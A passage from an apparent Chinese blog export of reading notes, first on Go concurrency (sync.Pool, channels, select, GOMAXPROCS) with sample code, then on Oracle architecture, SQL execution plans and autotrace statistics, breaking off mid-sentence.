ns/opPASS\n\n快了三个数量级，在处理代价昂贵的事务时使用这种模式可以极大的提高响应时间。\n当你的并发进程需要请求一个对象，但是在实例化之后很快地处理它们时，或者在这些对象的构造可能会对内存产生负面影响，这时最好使用Pool设计模式。然而，有些情况下要谨慎决定你是否应该使用Pool:如果你使用Pool代码所需要的东西不是大概同质的，那么从Pool中转化检索到所需要的内容的时间可能比重新实例化内容要花费的时间更多。例如，如果你的程序需要随机和可变长度的切片，那么Pool将不会对你有多大帮助。你直接从Pool中获得一个正确的切片的概率是很低的。\n所以当你使用Pool工作时，记住以下几点：\n\n当实例化sync.Pool,使用new方法创建一个成员变量，在调用时是线程安全的。\n当你收到一个来自 Get 的实例时，不要对所接收的对象的状态做出任何假设。\n当你用完了一个从Pool中取出来的对象时，一定要调用Put,否则，Pool就无法复用这个实例了。通常情况下，这是用defer完成的。\nPool内的分布必须大致均匀。\n\nChannelchannel是由Hoare的CSP派生的同步原语之一。虽然它们可以用来同步内存访问，但它们最好用于在goroutine之间传递信息。正如我们在第2章“Go语言的并发哲学”中所讨论的，在任何大小的程序中，channel都非常有用，因为它们可以组合在一起。\n就像河流一样，一个channel充当着信息传送的管道，值可以沿着channel传递，然后在下游读出。当你使用channel时，你会将一个值传递给一个chan变量，然后你程序中的某个地方将它从channel中读出。程序中不同的部分不需要相互了解，只需要在channel所在的内存中引用相同的位置即可。这可以通过对程序上下游的channel引用来完成。\n创建一个channel非常简单。使用内置的make函数：dataChan := make(chan any) 这是一个双向的channel。channel也可以声明为只支持单向的数据流，也就是说，可以定义一个channel只支持发送或接收信息：dataChan := make(chan&lt;- any) or dataChan := make(&lt;-chan any)通过 &lt;- 的方向来区分，还是非常直观的。\n但我们通常不会看到单向channel实例化，但是会经常看到它们用作函数参数和返回类型。当需要时，Go语言会隐式地将双向channel转换为单向channel。这里有一个例子：\nvar receiveChan &lt;-chan anyvar sendChan chan&lt;- anydataStream := make(chan any)// 有效的语法：receiveChan = datastreamsendChan = dataStream\n\n使用 channel 也是通过 &lt;- 操作符来完成。将数据放到channel中：dataChan &lt;- data从channel中读取数据：data := &lt;-dataChan\n尝试向只读的channel写数据会报错：invalid operation: cannot send to receive-only channel readOnlyCh (variable of type &lt;-chan int)尝试从只写的channel读数据会报错：invalid operation: cannot receive from send-only channel writeOnlyCh (variable of type chan&lt;- int)这是Go语言的类型系统的一部分，它允许我们在处理并发原语时使用type-safety。\nGo语言中的channel是阻塞的。这意味着只有 channel 内的数据被消费后，新的数据才能写入，而任何试图从空channel 读取数据的goroutine将等待至少一条数据被写入channel后才能读到。\n如果不正确地构造程序，这会导致死锁：\npackage mainimport (\t&quot;fmt&quot;)func main() &#123;\tstringStream := make(chan string)\tgo func() &#123;\t\tif 0 != 1 &#123;\t\t\treturn\t\t&#125;\t\tstringStream &lt;- &quot;Hello channels!&quot;\t&#125;()\tfmt.Println(&lt;-stringStream)&#125;\n\n通过 &lt;- 操作符的接受形式也可以选择返回两个值：data, ok := &lt;-dataChanok 是一个布尔值。当channel关闭时，ok为false，data为零值。当channel开启时，ok为true，data为channel中存储的值。如果没有数据，则会阻塞。使用 close(dataChan) 关闭一个channel。\n这为我们提供了一些新的模式。第一个是从channel中获取。通过range关键作为参数遍历（与for语句一起使用），并且在channel关闭时自动中断循环。这允许对channel上的值进行简洁的迭代。让我们看一个例子：\npackage mainimport &quot;fmt&quot;func main() &#123;\tintstream := make(chan int)\tgo func() &#123;\t\t// 我们确保在goroutine退出之前channel是关闭的。这是一个很常见的模式。\t\tdefer close(intstream)\t\tfor i := 1; i &lt;= 5; i++ &#123;\t\t\tintstream &lt;- i\t\t&#125;\t&#125;()\t// 遍历了 intstream\tfor integer := range intstream &#123;\t\tfmt.Printf(&quot;%v &quot;, integer)\t&#125;&#125;\n\n运行结果：1 2 3 4 5 \n注意该循环不需要退出条件，并且 range 方法不返回第二个布尔值。处理一个已关闭的 channel 的细节可以让你保持循环简洁。\n关闭 channel 也是一种同时给多个 goroutine 发信号的方法。 如果有 n 个 goroutine 在一个 channel 上等待，而不是在 channel 上写 n 次来打开每个 goroutine,你可以简单地关闭 channel。由于一个被关闭的 channel 可以被无数次读取，所以不管有多少 goroutine 在等待它，关闭 channel 都比执行 n 次更适合，也更快。这里有一个例子，可以同时打开多个 goroutine:\npackage mainimport (\t&quot;fmt&quot;\t&quot;sync&quot;)func main() &#123;\tbegin := make(chan any)\tvar wg sync.WaitGroup\tfor i := 0; i &lt; 5; i++ &#123;\t\twg.Add(1)\t\tgo func(i int) &#123;\t\t\tdefer wg.Done()\t\t\t&lt;-begin // goroutine会一直等待，直到它被告知可以继续。\t\t\tfmt.Printf(&quot;%v has begun\\n&quot;, i)\t\t&#125;(i)\t&#125;\tfmt.Println(&quot;Unblocking goroutines...&quot;)\tclose(begin) // 关闭channel,从而同时打开所有的goroutine。\twg.Wait()&#125;\n\n你可以看到，在我们关闭开始channel之前，所有的goroutine都没有开始运行：\nUnblocking goroutines...4 has begun2 has begun3 has beguno has begun1 has begun\n\n请记住在本章前面“sync包”中，我们讨论了使用sync.Cond类型执行相同的行为。你当然可以使用它，但是正如我们已经讨论过的，channel是可组合的。我们还可以创建 buffered channel,它是在实例化时提供容量的 channel。这意味着即使没有在 channel 上执行读取操作，goroutine 仍然可以执行 n 写入，其中 n 是缓冲 channel 的容量。dataChan := make(chan any, 4)创建一个有4个容量的缓冲channel。 这意味着我们可以把4个东西放到 channel 上，不管它是否被读取。这有点意思，因为它意味着 goroutine 可以控制实例化一个 channel 时否需要缓冲。这表明，创建一个 channel 应该与 goroutines 紧密耦合，而 goroutines 将会在它上面执行写操作，这样我们就可以更容易地推断它的行为和性能。\n没有缓冲的 channel 也被定义为缓冲 channel,一个无缓冲channel只是一个以0的容量创建的缓冲channel。a := make(chan any)和b := make(chan any, 0) 是等价的。请记住，当我们讨论阻塞时，如果说 channel 是满的，那么写入 channel 阻塞，如果 channel 是空的，则从 channels 读取的是什么？“Full”和“empty”是容量或缓冲区大小的函数。无缓冲channel的容量为零，因此在任何写人之前channel已经满了。一个没有下游接受的容量为4的缓冲channel在被写4次之后就满了，并且在写第5次的时候阻塞，因为它没有其他地方放置第五个元素。与未缓冲的channel一样，缓冲channel仍然阻塞；channel为空或满的前提条件是不同的。通过这种方式，缓冲channel是一个内存中的FIFO队列，用于并发进程进行通信。\n为了帮助理解这一点，让我们用例子来解释一个具有4个容量的缓冲 channel 的情况。首先，让我们来初始化： c ：= make(chan rune, 4)从逻辑上讲，这创建了一个带有四个槽的缓冲区。现在让我们往channel里写数据： c &lt;- &#39;A&#39;当这个channel没有下游读取时，一个数据将被放置在channel缓冲区的第一个槽中。然后 c &lt;- &#39;B&#39;、c &lt;- &#39;C&#39;、c &lt;- &#39;D&#39;，经过4次写入后，缓冲区已满。再试图写入 c &lt;- &#39;E&#39;，执行这个写入操作的 goroutine 将被阻塞，直到有读取操作。下游读取时会依次接受位于缓冲区中的数据，直到缓冲区为空。\n如果一个缓冲 channel 是空的，并且有一个下游接收，那么缓冲区将被忽略，并且该值将直接从发送方传递到接收方。在实践中这是透明的，但是对了解缓冲channel的配置是值得的。缓冲 channel 在某些情况下是有用的，但是应该小心地创建它们。缓冲channel很容易成为一个不成熟的优化，并且使隐藏的死锁更不容易发生。这听起来像是一件好事，但我猜你宁愿在第一次写代码的时候发现死锁，而不是在生产系统崩遗的时候才发现。\n程序如何与值为 nil 的 channel 交互？\nvar dataStream chan interface&#123;&#125;// 读取&lt;-dataStream// 写入dataStream &lt;- struct&#123;&#125;&#123;&#125;\n\n会报错：fatal error: all goroutines are asleep - deadlock!尝试close(dataStream)也会报错：panic: close of nil channel\n\nchannel 操作的结果给出了 channel 的状态：\n\n\n\n操作\nChannel 状态\n结果\n\n\n\nRead\nnil\n阻塞\n\n\nRead\n打开且非空\n输出值\n\n\nRead\n打开且空\n阻塞\n\n\nRead\n关闭\n&lt;默认值&gt;,false\n\n\nRead\n只写\n编译错误\n\n\nWrite\nnil\n阻塞\n\n\nWrite\n打开但填满\n阻塞\n\n\nWrite\n打开且不满\n写入值\n\n\nWrite\n关闭\npanic\n\n\nWrite\n只读\n编译错误\n\n\nClose\nnil\npanic\n\n\nClose\n打开且非空\n关闭Channel，读取成功，直到缓存被读完，然后读取生产者的默认值\n\n\nClose\n打开且空\n关闭Channel，读取生产者的默认值\n\n\nClose\n关闭\npanic\n\n\nClose\n只读\n编译错误\n\n\nchannel是吸引人们使用Go语言的原因之一。结合了goroutine和闭包的简单性，我很清楚地知道编写干净、正确的并发代码是多么容易。在很多方面，channel是将goroutine黏合在一起的黏合剂。本章应该给了你一个关于什么是channel以及如何使用它们的很好的概述。真正的乐趣始于我们开始编写channel以形成高阶并发设计模式。我们会在下一章讲到。\n期待。\nselect 语句select语句是将channel绑定在一起的黏合剂，这就是我们如何在一个程序中组合channel以形成更大的抽象事务的方式。声明select语句是一个具有并发性的Go语言程序中最重要的事情之一，这并不是夸大共词。在一个系统中两个或多个组件的交集中，可以在本地、单个函数或类型以及全局范围内找到select语句绑定在一起的channel。除了连接组件之外，在程序中的这些关键节点上，select语句可以帮助安全地将channel与诸如取消、超时、等待和默认值之类的概念结合在一起。\n那么这些强大的select语句是什么呢？我们如何使用它们，它们是如何工作的？让我们先把它放出来。这里有一个很简单的例子：\npackage mainfunc main() &#123;\tvar c1, c2 &lt;-chan any\tvar c3 chan&lt;- any\tselect &#123;\tcase &lt;-c1:\t\t//执行某些逻辑\tcase &lt;-c2:\t\t//执行某些逻辑\tcase c3 &lt;- struct&#123;&#125;&#123;&#125;:\t\t// 执行某些逻辑\t&#125;&#125;\n\n它看起来有点像一个选择模块，一个select模块包含一系列的case语句，这些语句可以保护一系列语句。然而，这就是相似之处。与switch块不同，select块中的case语句没有测试顺序，如果没有满足任何条件，执行也不会失败。\n相反，所有的channel读取和写入都需要查看是否有任何一个已准备就绪可以用的数据：在读取的情况下关闭channel,以及写入不具备下游消费能力的channel。如果所有channel都没有谁备好，则执行整个select语句模块。当一个channel准备好了，这个操作就会继续，它相应的语句就会执行。让我们来看一个简单的例子：\npackage mainimport (\t&quot;fmt&quot;\t&quot;time&quot;)func main() &#123;\tstart := time.Now()\tc := make(chan any)\tgo func() &#123;\t\t// 等待5s后关闭channel\t\ttime.Sleep(5 * time.Second)\t\tclose(c)\t&#125;()\tfmt.Println(&quot;Blocking on read...&quot;)\tselect &#123;\tcase &lt;-c:\t\t// 尝试在channel上读取数据\t\tfmt.Printf(&quot;Unblocked %v later.\\n&quot;, time.Since(start))\t&#125;&#125;\n\n输出如下：\nBlocking on read...Unblocked 5.0109829s later.\n\n在进人select模块后大约5秒，我们就会解锁。这是一种简单而有效的方法来阻止我们等待某事的发生，但如果我们思考一下，我们可以提出一些问题：\n\n当多个channel有数据可供给下游读取的时候会发生什么？\n如果没有任何可用的channel怎么办？\n如果我们想要做一些事情，但是没有可用的channels怎么办？\n\npackage mainimport (\t&quot;fmt&quot;)func main() &#123;\tc1 := make(chan any)\tclose(c1)\tc2 := make(chan any)\tclose(c2)\tvar c1Count, c2Count int\tfor i := 1000; i &gt; 0; i-- &#123;\t\tselect &#123;\t\tcase &lt;-c1:\t\t\tc1Count++\t\tcase &lt;-c2:\t\t\tc2Count++\t\t&#125;\t&#125;\tfmt.Printf(&quot;c1Count:%d\\nc2Count:%d\\n&quot;, c1Count, c2Count)&#125;\n\n输出如下：\nc1Count:485c2Count:515\n\n在一千次迭代中，大约有一半的时间从c1读取se1ect语句，大约一半的时间从c2读取。这看起来很有趣，也许有点太巧了。事实如此！Go 语言运行时将在一组case语句中执行伪随机选择。这就意味着，在你的case语句集合中，每一个都有一个被执行的机会。乍一看，这似乎并不重要，但背后的原因却非常有趣。让我们先做一个很明显的阐述：Go语言运行时无法解析select语句的意图，也就是说，它不能推断出问题空间，或者说为什么将一组channel组合到一个select语句中。正因为如此，运行时所能做的最好的事情就是在平均情况下运行良好。一种很好的方法是将一个随机变量引入到等式中（在这种情况下，se1ect后续的channel)。通过加权平均每个channel被使用的机会，所有使用select语句的程序将在平均情况下表现良好。\n关于第二个问题：如果没有任何channel可用，会发生什么？如果所有的channel都被阻塞了，如果没有可用的，但是你可能不希望永远阻塞，可能需要超时机制。Go语言的time包提供了一种优雅的方式，可以在select语句中很好地使用channel。这里有一个例子：\npackage mainimport (\t&quot;fmt&quot;\t&quot;time&quot;)func main() &#123;\tvar c &lt;-chan int\tselect &#123;\tcase &lt;-c:\tcase &lt;-time.After(1 * time.Second):\t\tfmt.Println(&quot;Timed out.&quot;)\t&#125;&#125;\n\n这个case语句永远不会被解锁，因为我们是从 nil channel 读取的。输出如下：Timed out.time.After 函数通过传入 time.Duration 参数返回一个数值并写入 channel,该channel会返回执行后的时间。这为select语句提供了一种简明的方法。\n最后一个问题：当没有可用channel时，我们需要做些什么？像case语句一样，select语句也允许默认的语句。就像“case”语句一样，当“select’”语句中的所有channel都被阻塞的时候，“select”语句也允许你调用默认语句。以下是一个实例：\npackage mainimport (\t&quot;fmt&quot;\t&quot;time&quot;)func main() &#123;\tstart := time.Now()\tvar c1, c2 &lt;-chan int\tselect &#123;\tcase &lt;-c1:\tcase &lt;-c2:\tdefault:\t\tfmt.Printf(&quot;In default after %v\\n&quot;, time.Since(start))\t&#125;&#125;\n\n输出如下：In default after 0s可以看到，它几乎是瞬间运行了默认语句。这允许在不阻塞的情况下退出 select 模块。通常，你将看到一个默认的子句，它与 for-select 循环一起使用。这允许goroutine在等待另一个goroutine上报结果的同时，可以继续执行自己的操作。这里有一个例子：\npackage mainimport (\t&quot;fmt&quot;\t&quot;time&quot;)func main() &#123;\tdone := make(chan interface&#123;&#125;)\tgo func() &#123;\t\ttime.Sleep(5 * time.Second)\t\tclose(done)\t&#125;()\tworkCounter := 0loop:\tfor &#123;\t\tselect &#123;\t\tcase &lt;-done:\t\t\tbreak loop\t\tdefault:\t\t&#125;\t\t// 模拟工作行为\t\tworkCounter++\t\ttime.Sleep(1 * time.Second)\t&#125;\tfmt.Printf(&quot;Achieved %v cycles of work before signalled to stop.\\n&quot;, workCounter)&#125;\n\n输出如下：Achieved 5 cycles of work before signalled to stop.\n在这种情况下，我们有一个循环，它在执行某种操作，偶尔检查它是否应该被停止。最后，对于空的select语句有一个特殊的情况：选择没有case子句的语句。看起来像这样： select &#123;&#125; 这个语句将永远阻塞。在第6章中，我们将深入研究select语句是如何工作的。从更高层次的角度来看，它应该是显而易见的，它可以帮助你安全高效地组合各种概念和子系统。\nGOMAXPROCS 控制在runtime包中，有一个函数称为GoMAXPR0CS。这个名称是有误导性的：人们通常认为这个函数与主机上的逻辑处理器的数量有关（而且与它调度方式有关)，但实际上这个函数控制的OS线程的数量将承载所谓的“工作队列”。有关这个函数的更多信息以及它的工作原理，请参见第6章。在Go语言1.5之前，GoMAXPR0CS总是被设置为1，通常你会在大多数Go语言程序中找到这段代码：runtime.GOMAXPROCS(runtime.NumCPU())几乎大部分开发人员希望当他们的程序正在运行时，可以充分利用机器上的所有CPU核心。（我还真干过）因此，在随后的Go语言版本中，它自动设置为主机上逻辑CPU的数量。\n那么为什么要调整这个值呢？大部分时间你都不太想去调节它。Go语言的调度算法在大多数情况下已经足够好了，在增加或减少工作队列和线程数量的情况下，可能会造成更多的问题，但是仍然有一些情况会改变这个值。例如，我在一个项目上调试，这个项目有一个测试组件，它被竞争环境困扰。不管怎么说，这个团队有几个包，有时候测试失败。我们运行测试的主机有四个逻辑CPU,因此在任何一个点上，我们都有四个goroutines同时执行。通过增加GoMAXPROCS以超过我们拥有的逻辑CPU数量，我们能够更频繁地触发竞争条件，从而更快地修复它们。\n其他人可能通过实验发现，他们的程序在一定数量的工作队列和线程上运行得更好，但我更主张谨慎些。如果你通过调整这个方法来压缩性能，那么在每次提交之后，当你使用不同的硬件，以及使用不同版本的Go语言时，一定要这样做。调整这个值会使你的程序更接近它所运行的硬件，但以抽象和长期性能稳定为代价。\n","categories":["读书笔记"],"tags":["《go语言并发之道》","go","并发"]},{"title":"《收获，不止Oracle》读书笔记上篇-开始和物理体系","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8A%E6%94%B6%E8%8E%B7%EF%BC%8C%E4%B8%8D%E6%AD%A2Oracle%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%8A%E7%AF%87-%E5%BC%80%E5%A7%8B%E5%92%8C%E7%89%A9%E7%90%86%E4%BD%93%E7%B3%BB/","content":"前言由于想深入了解下数据库，包括索引、分区表以及sql优化相关的知识，加上工作使用的是 Oracle 数据库。所以选择这本书开始学习。最开始看的时候，已经看了四章了。但是不做笔记，总是看了后面忘了前面，所以决定重读并且记笔记。主要及一些重点，方便以后查阅和回忆。（当然，可能会有很多引用原文的部分，也会有自己的总结。引用的部分就不一一标注了，不过基本也能看出来）\n第一章 - 意识，少做事从学习开始这一章的重点就是，学什么要先了解做什么。学了没想过怎么用，或者干脆不用，基本上是白学的。先讲下数据库应用的基本功能，再根据具体的角色（DBA、开发、运维等）看具体该如何使用，根据使用的侧重点不同，而对数据库不同进行深度的学习。毕竟数据库体系是庞大的，想要全盘掌握不现实，也不必要。按需学习即可。\n这里作者是以手机的例子，加以二八现象说明。即百分之二十的功能实现百分之八十的需求，数据库也是一样。对于开发人员来说，首先应该了解 SQL 的编写，而不是数据库的备份和恢复。而对于运维或者DBA来说，了解数据库的备份和恢复则更为重要。\n首先，数据库应用的功能主要分为 数据库开发、数据库管理、数据库优化、数据库设计 四类（当然只是大概）。侧重点如下：\n\n开发：能利用SQL完成数据库的查增删改的基本操作：能用PL&#x2F;SQL完成及各类逻辑的实现。\n管理：能完成数据库的安装、部署、参数调试、备份恢复、数据迁移等系统相关的工作：能完成分配用户、控制权限、表空间划分等管理相关工作：能进行故障定位、问题分析等数据库诊断修复相关工作。\n优化：在深入了解数据库的运行原理的基础上，利用各类工具及手段发现并解决数据库存在的性能问题，从而提升数据库运行效率，这个说着轻巧，其实很不容易。\n设计：深刻理解业务需求和数据库原理，合理高效地完成数据库模型的建设，设计出各类表及索引等数据库对象，让后续应用开发可以高效稳定。\n\n\n我的角色目前是开发，后续笔记中也会侧重于开发的内容。除此之外，也会带一些我感兴趣的内容。\n第二章 - 震惊，体验物理体系之旅不论什么角色，基础原理都是必学的。首先就是物理体系结构，平时遇到的各种数据库相关问题，很多都可以从中找到解决方法。\n\n\nOracle由实例和数据库组成，我特意用两个虚框标记出来，上半部的直角方框为实例instance,下半部的圆角方框为数据库Database,大家可以看到我在虚线框左上角做的标注。\n实例是由一个开辟的共享内存区SGA(System Global Area)和一系列后台进程组成的，其中SGA最主要被划分为共享池(shared pool)、数据缓存区(db cache)和日志缓存(log buffer)三类。后台进程包括图2-2中所示的PMON、SMON、LCKn、RECO、CKPT、DBWR、LGWR、ARCH等系列进程。\n数据库是由数据文件、参数文件、日志文件、控制文件、归档日志文件等系列文件组成的，其中归档日志最终可能会被转移到新的存储介质中，用于备份恢复使用。大家请注意看图2-2中的圆形虚线框标记部分的一个细节，PGA(Program Global Area)区，这也是一块开辟出来的内存区，和SGA最明显的差别在于，PGA不是共享内存，是私有不共亨的，S理解为共享的首字母。用户对数据库发起的无论查询还是更新的任何操作，都是在PGA先预处理，然后接下来才进入实例区域，由SGA和系列后台进程共同完成用户发起的请求。\nPGA起到的其体作用，也就是前面说的预处理，是什么呢？主要有三点：第一，保存用户的连接信息，如会话属性、绑定变量等：第二，保存用户权限等重要信息，当用户进程与数据库建立会话时，系统会将这个用户的相关权限查询出来，然后保存在这个会话区内：第三，当发起的指令需要排序的时候，PGA(Program Global Area)正是这个排序区，如果在内存中可以放下排序的尺寸，就在内存PGA区内完成，如果放不下，超出的部分就在临时表空间中完成排序，也就是在磁盘中完成排序。\n我在图中标识了三块区域（大家注意看虚线框的左下角标注），分别是1区圆形虚线框，2区直角方形虚线框，3区圆角方形虚线框。用户的请求发起经历的顺序一般如下：1区→2区→3区：或者1区→2区。\n\n从这个体系结构可以提出一些问题，提问很重要！\n\n为什么会有用户的请求不经过3区数据库的情况，直接从2区实例返回了？\n为什么SGA要划分为共享池、数据缓存区、日志缓存区，它们的作用分别是什么？\n为什么数据量大时排序会导致sql执行非常缓慢？（这个问题从上面的体系结构中显而易见）\n\n从普通查询 sql 开始从简单的查询sql select object_name from t where object_id=29; 开始。当用户发起这个sql指令后，首先会从1区开始做准备。\nPGA区域是仅供当前发起用户使用的私有内存空间，这个区域有三个作用，但这里的连接只完成了用户连接信息的保存和q权限的保存。只要该session不断开连接，下次便可以直接从PGA中获取，而不用去硬盘中读取数据。此外，该sql还会匹配成一条唯一的HASH值，然后进入2区域。首先进入SGA区的共享池。进入共享池后，先查询是否有地方存储过这个sql（HASH值，唯一标识一个sql）。\n如果没有，那首先就要查询这个sql语法是否正确（from是否写成form），语义是否正确（字段、表是否存在），是否有权限。都没问题则会生成唯一HASH并保存。接下来开始解析，看是否有索引，是索引读高效还是全表扫描高效？oracle要做出抉择。\n如何做出抉择？将两种方式都估算一下，看那个代价（COST）更低。这里比较并不会真正分别执行两次来比较，具体方法后文会有。将代价更低的执行计划保存起来，并于HASH对应起来。有了执行计划之后，便来到数据缓存区来查询数据了。当数据缓存区找不到需要的数据时，便会去3区的数据库中查找，当然得按照执行计划来，这是圣旨，不可违抗。找到后，回到数据缓存区返回，找不到，就找不到了。\n\n这里2区中的日志缓存区并没有说到\n3区也只描述了一个数据文件，其他文件并没有被提及\n2区中除了SGA，还有很多进程，他们的作用也没有被提及\n\n下面开始实践，可以先跳至文末，搭建Oracle的环境。\ndrop table t;create table t asselect *from all_objects;create index idx_object_id on t (object_id);-- 跟踪SQL的执行计划和执行的统计信息set autotrace on-- 设置查询结果在屏幕上显示时每行的最大字符数，使得查询结果不被截断，提高可读性set linesize 1000-- 跟踪该语句执行完成的时间set timing onselect object_namefrom twhere object_id = 29;\n\n第一次查询结果\nSQL&gt; select object_name from t where object_id = 29;OBJECT_NAME--------------------------------------------------------------------------------------------------------------------------------C_COBJ#Elapsed: 00:00:00.67Execution Plan----------------------------------------------------------Plan hash value: 1296629646-----------------------------------------------------------------------------------------------------| Id  | Operation                           | Name          | Rows  | Bytes | Cost (%CPU)| Time     |-----------------------------------------------------------------------------------------------------|   0 | SELECT STATEMENT                    |               |     1 |    79 |     2   (0)| 00:00:01 ||   1 |  TABLE ACCESS BY INDEX ROWID BATCHED| T             |     1 |    79 |     2   (0)| 00:00:01 ||*  2 |   INDEX RANGE SCAN                  | IDX_OBJECT_ID |     1 |       |     1   (0)| 00:00:01 |-----------------------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   2 - access(&quot;OBJECT_ID&quot;=29)Note-----   - dynamic statistics used: dynamic sampling (level=2)Statistics----------------------------------------------------------         11  recursive calls          0  db block gets         83  consistent gets          1  physical reads          0  redo size        594  bytes sent via SQL*Net to client        108  bytes received via SQL*Net from client          2  SQL*Net roundtrips to/from client          0  sorts (memory)          0  sorts (disk)          1  rows processed\n\n第二次查询结果：\nSQL&gt; select object_name from t where object_id = 29;OBJECT_NAME--------------------------------------------------------------------------------------------------------------------------------C_COBJ#Elapsed: 00:00:00.27Execution Plan----------------------------------------------------------Plan hash value: 1296629646-----------------------------------------------------------------------------------------------------| Id  | Operation                           | Name          | Rows  | Bytes | Cost (%CPU)| Time     |-----------------------------------------------------------------------------------------------------|   0 | SELECT STATEMENT                    |               |     1 |    79 |     2   (0)| 00:00:01 ||   1 |  TABLE ACCESS BY INDEX ROWID BATCHED| T             |     1 |    79 |     2   (0)| 00:00:01 ||*  2 |   INDEX RANGE SCAN                  | IDX_OBJECT_ID |     1 |       |     1   (0)| 00:00:01 |-----------------------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   2 - access(&quot;OBJECT_ID&quot;=29)Note-----   - dynamic statistics used: dynamic sampling (level=2)Statistics----------------------------------------------------------          0  recursive calls          0  db block gets          4  consistent gets          0  physical reads          0  redo size        594  bytes sent via SQL*Net to client        108  bytes received via SQL*Net from client          2  SQL*Net roundtrips to/from client          0  sorts (memory)          0  sorts (disk)          1  rows processed\n\n先简单介绍下统计信息中各个信息的含义：\n\nRecursive Calls: 表示查询执行期间数据库内部发生的递归调用次数，这可能包括子查询、视图的重写以及其他内部处理所需的多次查询执行。\nDB Block Gets: 指从数据库缓存区中读取数据块的次数，反映的是从内存中获取数据的频率。\nConsistent Gets: 代表为维护数据一致性而从数据库缓存中获取数据块的次数。这在读一致性要求高的查询中尤为重要，确保查询看到的是事务开始那一刻的数据版本。\nPhysical Reads: 指从磁盘上实际读取数据块的次数，发生物理读取通常意味着所需数据未在数据库缓存区中找到，需要从持久存储中加载。\nRedo Size: 记录由于本次操作产生的重做日志大小，单位通常是字节。重做日志用于事务恢复。\nBytes Sent via SQLNet to Client: 通过SQLNet网络协议发送到客户端的数据量，包括查询结果集等信息。\nBytes Received via SQLNet from Client: 通过SQLNet网络协议从客户端接收的数据量，主要涉及客户端发送的查询请求等。\nSQL*Net Roundtrips to&#x2F;from Client: 完成查询操作所需的客户端与服务器之间的网络往返次数，每次往返可能涉及请求或响应。\nSorts (Memory): 在内存中执行的排序操作次数，用于组织数据以便于高效查询或显示。\nSorts (Disk):当内存不足，需要使用临时表空间在磁盘上进行排序操作的次数，这通常比内存排序效率低。\nRows Processed: 查询最终处理的行数，即查询结果集中包含的行数。\n\n第一次执行花费0.67秒，第二次只花费了0.27秒。比第一次快了很多接下来是统计信息的差别第一次执行，产生了11次递归调用、83次逻辑读、1次物理读第二次执行，产生了0次递归调用、4次逻辑读、0次物理读\n下面是描述两次执行的差异：\n\n用户首次执行该SQL指令时，该指令从磁盘中获取用户连接信息和相关权限信息权限，并保存在PGA内存里。当用户再次执行该指令时，由于SESSION之前未被断开重连，连接信息和相关权限信息就可以在PGA内存中直接获取，避免了物理读。\n首次执行该SQL指令结束后，SGA内存区的共享池里已经保存了该SQL唯一指令HASH值，并保留了语法语意检查及执行计划等相关解析动作的劳动成果，当再次执行该$QL时，由于该SQL指令的HASH值和共享池里保存的相匹配了，所以之前的硬解析动作就无须再做，不仅跳过了相关语法语意检查，对于该选取哪种执行计划也无须考虑，直接拿来主义就好了。\n首次执行该SQL指令时，数据一般不在SGA的数据缓存区里（除非被别的SQL读入内存了)，只能从磁盘中获取，不可避免地产生了物理读，但是由于获取后会保存在数据缓存区里，再次执行就直接从数据缓存区里获取了，完全避免了物理读，就像上面的实践一样，首次执行物理读为4，第2次执行的物理读为0，没有物理读，数据全在缓存中，效率当然高得多！\n\n即，不用获取用户和权限相关信息、不用进行语法检查和执行计划等相关解析、不用从磁盘获取直接从缓存获取。\n体会Oracle的代价在表有索引的情况下，Oracle可以选择索引读，也可以选择全表扫描，这是两种截然不同的执行计划，不见得一定是索引读胜过全表扫，有时索引读的效率会比全表扫更低所以Oracle的选择不是看是啥执行计划，而是判断谁的代价更低。下面来比较下两者的代价\n这里会使用 HINT 的写法。HINT是一种强制写法，让数据库的查询优化器遵循某种特定的执行路径或采用特定的算法来处理查询。详细的介绍，放在文末。使用 /*+full(t)*/ 的写法，来强制该sql不走索引，走全表扫描。如下：select /*+full(t)*/object_name from t where object_id = 29;\n\n多次执行同一个SQL查询，可以解析次数减少、物理读减少甚至递归调用次数\n\n下面是走全表扫描的执行结果：\nSQL&gt; select /*+full(t)*/object_name from t where object_id = 29;OBJECT_NAME--------------------------------------------------------------------------------------------------------------------------------C_COBJ#Elapsed: 00:00:00.03Execution Plan----------------------------------------------------------Plan hash value: 1601196873--------------------------------------------------------------------------| Id  | Operation         | Name | Rows  | Bytes | Cost (%CPU)| Time     |--------------------------------------------------------------------------|   0 | SELECT STATEMENT  |      |     1 |    44 |   410   (0)| 00:00:01 ||*  1 |  TABLE ACCESS FULL| T    |     1 |    44 |   410   (0)| 00:00:01 |--------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   1 - filter(&quot;OBJECT_ID&quot;=29)Statistics----------------------------------------------------------          0  recursive calls          0  db block gets       1514  consistent gets          0  physical reads          0  redo size        594  bytes sent via SQL*Net to client        108  bytes received via SQL*Net from client          2  SQL*Net roundtrips to/from client          0  sorts (memory)          0  sorts (disk)          1  rows processed\n\n比较走全表扫描和oracle自己选择的使用索引的方式的执行计划和统计信息，发现代价（Cost）410远大于2，1514次逻辑读也远大于4次。显而易见，走索引的方式代价更低。\n同时，选择的操作也比较艰难，缓存选择的结果，也能避免做重复的事情，提高效率。\n第一个问题这里已经有答案了，那就是有缓存的存在，使得后续相同的查询不需要经过3区数据库，直接从2区的缓存中获取结果并返回。\n再探体系结构原理从普通更新语句开始下面主要是二三问题的解答，即体系结构图中上面没有被提及到的组件、进程的作用是什么？\nsql语句除了上面的查询，还有更新语句，包括插入、修改、删除三类。如果是一个只读数据库，那么是不需要这么多组件的。下面以 update t set object_id=92 where object_id=29; 为例。\nsql执行过程前面和查询语句是一样的\n\n如果该用户并没有退出原连接去新建立一个连接，PGA区的用户连接信息和权限判断等诸多动作依然不用做，否则需要完成用户连接信息和权限判断等诸多动。\n如果该语句是第一次执行，在共享池里依然需要完成语法语意分析及解析，update t set object_id&#x3D;92 where 